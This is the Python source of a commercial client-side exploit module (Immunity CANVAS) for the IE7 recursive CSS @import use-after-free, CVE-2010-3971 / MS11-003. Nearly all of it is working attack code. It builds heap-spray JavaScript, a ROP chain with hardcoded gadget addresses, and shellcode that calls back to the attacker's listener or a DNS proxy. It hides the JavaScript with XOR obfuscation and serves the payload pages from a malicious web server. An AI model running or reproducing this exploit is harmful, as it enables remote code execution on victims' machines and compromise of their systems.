#! /usr/bin/env python

#
# CANVAS Exploit
#

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2011
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path: sys.path.append(".")
import hashlib
import random

from exploitutils import *
from shellcode import shellcodeGenerator
from tcpexploit import tcpexploit
from MOSDEF import mosdef
from httpclientside import httpclientside
from libs.jsobfuscate.jsobfuscate import JSObfuscator

NAME                           = "IE7 recursive import css vulnerability"
DESCRIPTION                    = "Client-Side vulnerability in IE7 (MS11-003)"
DOCUMENTATION                  = {}
DOCUMENTATION["Repeatability"] = "Infinite"
DOCUMENTATION["CVE Name"]      = "CVE-2010-3971"
DOCUMENTATION["MSADV"]         = "MS11-003"
VERSION                        = "1.0"

PROPERTY                       = {}
PROPERTY['TYPE']               = "Exploit"
PROPERTY['SITE']               = "Client Side"
PROPERTY['ARCH']               = [ ["Windows"] ]
PROPERTY['VERSION']            = [ "2000", "XP", "Vista" ]

NOTES="""
This exploit supports DNS MOSDEF functionality through ClientD.

http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3971
http://www.breakingpointsystems.com/community/blog/ie-vulnerability/
http://www.microsoft.com/technet/security/Bulletin/MS11-003.mspx


This is a use-after-free of an array of stylesheet objects.

The nested @import calls:
  mshtml!CSharedStyleSheet::Notify
   mshtml!CStyleSheet::Notify
     mshtml!CStyleSheet::ReconstructStyleSheet
       mshtml!CStyleSheet::AddImportedStyleSheet
         mshtml!CStyleSheetArray::CreateNewStyleSheet
           mshtml!CStyleSheet::Create
             mshtml!CStyleSheet::AttachEarly
               mshtml!CStyleSheet::ConnectSharedStyleSheet
                 mshtml!CImplPtrAry::Append (which ends up calling RtlReAllocateHeap)

It adds a new element to the array of shared CStyleSheet's while processing that array, so the realloc call frees
the array that is currently traversed and allocate a new one, big enough to contain the new element.
This freed array can be filled later (almost after the free), with the name of the next @import.
The size of the array is 4*number_of_imports*2 bytes, so the name of the CSS must fit in a block of that size.
We choose number_of_imports = 0xC (object size 0x60 bytes) to move out of some noise in the heap caused by the new stylesheets being created.

"""

CHANGELOG="""

"""

class theexploit(httpclientside):
    def __init__(self):
        tcpexploit.__init__(self)
        httpclientside.__init__(self)

        self.searchMethod = self.FindBrowser_FindAnyTag_CmpExtraInfo
        self.UserAgent = [("Mozilla/", "MSIE", "")]
        self.plugin_info = None # we want clientd to give us a plugin dict
        self.supports_dns_mosdef = True
        self.shellcode="\xcc" * 298
        self.setVersions()
        self.version=1
        self.badstring="" #bad strings are for wusses :>
        self.name=NAME 
        self.filename="".join( [ random.choice(string.uppercase) for x in range(8) ] ) + ".html"
        self.number_of_imports = 0xC
        self.cssname=u"\u1024\u0900"*((self.number_of_imports*2) - 2)        
        self.jsObfuscator = JSObfuscator()
        self.jsObfuscator.xorKeyFromCookie("SessionID")


    def random_dummy_string(self, prefix=""):
        h = hashlib.new('sha1')
        h.update(str(random.random() * 10).replace('.', ''))
        retval = h.hexdigest()
        retval = '%s%.5s' % (prefix, retval)
        return retval
    
    # This is expecting an info_dict that is populated like so:
    #
    # info_dict['plugins'] = parse_plugin_data(plugins_dict)
    # info_dict['user_agent'] = clientheader.getStrValue(['User-Agent'])
    #
    # self.plugin_info comes from clientd in parse_plugin_data scrubbed format
    
    def is_vulnerable(self, info_dict):
        """
        Check to make sure this is something we want to run,
        in this case, it means "running IE 7 and a language we have 
        a target for.
        """ 
        if "MSIE 7.0" in info_dict['user_agent']:
            return 50

        self.log("Not IE7 - possibly vulnerable, but not to this exploit")
        return 0

    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={}
        #name, jmp esp, writeloc, writable, shelloc
        self.versions[1]=("Windows - all versions",None)

    def neededListenerTypes(self):
        return self.clientSideListenerTypes()
    
    def createShellcode(self):
        #get us a clean stack to play with and save the original EBP for continuation of execution
        before_shellcode="""
xorl %ecx,%ecx
movl %fs:0x8(%ecx),%esp
addl $0x2000, %esp
movl %ebp, 0x09001028(%ecx)
"""
        
        continuation_code="""
xorl %ecx,%ecx
xorl %eax,%eax
movl 0x09001028(%ecx), %ebp
movl %ebp, %esp
subl $0x10, %esp
popl %edi
popl %esi
popl %ebx
leave
ret $4
"""
        injectme = self.createWin32Shellcode_universal(self.badstring, self.callback.ip, self.callback.port)

        if not self.DNSMOSDEF:
            sc = shellcodeGenerator.win32()
            sc.vProtectSelf=False
            sc.vAllocSelf = False
            sc.addAttr("findeipnoesp", {"subespval": 0})
            sc.addAttr("InjectToSelf", { "injectme" : injectme, "customexit" : continuation_code })
            self.shellcode = mosdef.assemble(before_shellcode, "x86") + sc.get()
        else:
            import shellcode.standalone.windows.payloads as payloads

            p = payloads.payloads()
            cd = "C000.00.%s.ms11003.com" % (self.random_dummy_string())
            sc = p.dns_proxy(cd, self.callback.ip) #we'll need to tweak the domain
            sc = p.assemble(sc)
            self.shellcode = mosdef.assemble(before_shellcode, "x86") + sc

        return len(self.shellcode)

    def makefile(self):
        """
        ROP strategy:
        * IEUI dependant only
        
        - LoadLibraryA(kernel32.dll)
        - GetProcAddress(VirtualProtect)
        - VirtualProtect(0x09001024, 0x1000, 0x40, somethin_an_other...)
        - exec shellcode
        """
        
        replaces={}
        replaces["SHELLCODE"]=urluencode(self.shellcode)
        replaces["STACKPIVOT"]="0x5DFFF66B"
        replaces["LoadLibraryA"]="0x5DFF1074"
        replaces["GetProcAddress"]="0x5DFF1068"
        replaces["POPEAX"]="0x5DFF21CC"
        replaces["POPECX"]="0x5DFF3E21"
        replaces["POPEDI"]="0x5DFF1041"
        replaces["MOVEAX,[EAX]RETEAX"]="0x5DFF6621"
        replaces["MOV[ECX+24],EAX"]="0x5E00FE05"
        replaces["JMPEAX"]="0x5DFF6623"
        
        filedata="""
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
  <head></head>
  <body><script>"""
        
        js="""
function format_string(str) {
  str+=unescape("%u0000");
  var out="";
  
  for (x = 0; x < str.length; x+=4) {
    num = str.charCodeAt(x);
    if (x+1 < str.length) num = num + (str.charCodeAt(x+1) << 8)
    if (x+2 < str.length) num = num + (str.charCodeAt(x+2) << 16)
    if (x+3 < str.length) num = num + (str.charCodeAt(x+3) << 24)
    out+=format_dword(num);
  }
  
  return out;
}

function format_dword(num) {
  tmp=num.toString(16);
  tmp="00000000".substring(0,8-tmp.length)+tmp;
  return unescape("%u"+tmp.substring(4,8) + "%u" + tmp.substring(0,4));
}

function ie8_spray(obj, finalsize, chunksize, count){
  chunksize/=2; //unicode chars
  finalsize/=2; //unicode chars

  var shellcode = unescape("SHELLCODE");
  var chunkbase = obj + shellcode;
  
  while (chunkbase.length < chunksize) //alignment padding
    chunkbase+=unescape("%u4141");
  
  while (chunkbase.length < finalsize) //big page size
    chunkbase+=chunkbase;

  var chunkbase1 = chunkbase.substring(0, finalsize/2);
  var chunkbase2 = chunkbase.substring(finalsize/2, finalsize-0x812);
  
  var arr = new Array();
  arr[0] = chunkbase1 + chunkbase2;
  
  for (var i=1; i < count; i++)
    arr[i] = arr[0].substring(0, arr[0].length);
  
  return arr;
}

var obj="";
obj+=format_dword(0x09001024+0x60); //0x00 - mov     eax, [ecx]
obj+=format_dword(0x00000000); //0x04 
obj+=format_dword(0x00000000); //0x08 
obj+=format_dword(0x00000000); //0x0C 
obj+=format_dword(0x00000000); //0x10 
obj+=format_dword(0x00000001); //0x14 - cmp     dword ptr [ecx+18h],1/jz - True Branch
obj+=format_dword(0x00000080); //0x18 - mov     eax, [ecx+18h]/test al,al/jns - False Branch
obj+=format_dword(0x09001024); //0x1C - mov     ecx, [ecx+1Ch]/test ecx,ecx/jnz - True Branch
obj+=format_dword(0x09001024); //0x20 - mov     ecx, [ecx+20h]
obj+=format_dword(0x00000000); //0x24
obj+=format_dword(0x00000000); //0x28
obj+=format_dword(0x00000000); //0x2C
obj+=format_dword(0x00000000); //0x30
obj+=format_dword(0x00000000); //0x34 - test    byte ptr [eax+34h], 2/jnz - False branch
obj+=format_dword(0x00000000); //0x38
obj+=format_dword(0x00000000); //0x3C
obj+=format_dword(0x00000000); //0x40
obj+=format_dword(0x00000000); //0x44
obj+=format_dword(0x00000000); //0x48
obj+=format_dword(0x00000000); //0x4C
obj+=format_dword(0x00000000); //0x50
obj+=format_dword(0x00000000); //0x54
obj+=format_dword(0x00000000); //0x58
obj+=format_dword(0x09001024); //0x5C - mov     eax, [esi+5Ch]

//ROP
obj+=format_dword(POPEAX);                       //0x60
obj+=format_dword(LoadLibraryA);                 //0x64
obj+=format_dword(MOVEAX,[EAX]RETEAX);           //0x68 - after this: EAX = NTDLL base handle
obj+=format_dword(0x00000000);                   //0x6C - SPARE
obj+=format_dword(POPECX);                       //0x70
obj+=format_dword(0x09001024+0xBC);              //0x74 - kernel32.dll string
obj+=format_dword(0x09001024-0X24+0x9C);         //0x78 - address to patch the ROP
obj+=format_dword(POPEDI);                       //0x7C - just to get rid of the next dword
obj+=format_dword(STACKPIVOT);                   //0x80 - mov     edx, [eax+20h]/jmp edx (eax == +0x60)
obj+=format_dword(MOV[ECX+24],EAX);              //0x84 - patch ROP with kernel32 handle for GetProcAddress
obj+=format_dword(POPEAX);                       //0x88
obj+=format_dword(GetProcAddress);               //0x8C
obj+=format_dword(MOVEAX,[EAX]RETEAX);           //0x90
obj+=format_dword(0x00000000);                   //0x94 - SPARE
obj+=format_dword(JMPEAX);                       //0x98 - EAX == VirtualProtect address
obj+=format_dword(0xcafecafe);                   //0x9C - GetProcAddres 1st argument - kernel32 Handle
obj+=format_dword(0x09001024+0xCC);              //0xA0 - GetProcAddres 2nd argument - Proc Name
obj+=format_dword(0x00000000);                   //0xA4 - SPARE
obj+=format_dword(0x09001024+0xDC);              //0xA8 - return to shellcode directly 
obj+=format_dword(0x09001000);                   //0xAC - VirtualProtect 1st Arg - Addr
obj+=format_dword(0x00003000);                   //0xB0 - VirtualProtect 2nd Arg - Size
obj+=format_dword(0x00000040);                   //0xB4 - VirtualProtect 3rd Arg - newprot
obj+=format_dword(0x09001024);                   //0xB8 - VirtualProtect 4th Arg - oldprot ptr

obj+=format_string("kernel32.dll");              //0xBC - zero ended, DWORD aligned
obj+=format_string("VirtualProtect");            //0xCC - zero ended, DWORD aligned


ref = ie8_spray(obj, 0x00100000, 0x1000, 0x80);

elem = document.createElement("link");
elem.rel="stylesheet";
elem.type="text/css";
elem.href="anycssnameworks.css";
document.getElementsByTagName("head")[0].appendChild(elem);
"""
        
        for k,v in replaces.iteritems():
            js=js.replace(k,v)
        
        filedata+=self.jsObfuscator.obfuscate(js)
        
        filedata+="""
</script>
  </body>
</html>
        """
        
    
        return filedata
    
    def makecss(self):
        filedata=("@import url(" + self.cssname + ");")*self.number_of_imports
        
        return filedata.encode("utf-16")
        
    def makesploit(self,clientheader,clientbody):
        """
        Construct the attack
        """
        from libs.spkproxy import header, body
        h=header("SERVER")
        b=body()
        self.log("Request: "+clientheader.URL)
        if clientheader.URL.count(self.filename):
            #the exploit
            self.log("sending HTML")
            self.createShellcode()
            sploitstring=self.makefile()
            b.setBody(sploitstring)
            h.addHeader('Set-Cookie','SessionID=%d' % self.jsObfuscator.getXORKey())
            h.addHeader("Content-Type","text/html")
        elif len(clientheader.URL) > 3:
            self.log("sending CSS")
            sploitstring=self.makecss()
            b.setBody(sploitstring)
            h.addHeader("Content-Type","text/css")
        else:
            #redirect to self
            self.log("redirecting to self")
            h.status="302"
            h.addHeader("Location",self.filename)
            h.addHeader("Content-Type","text/html")

        return h,b



if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    
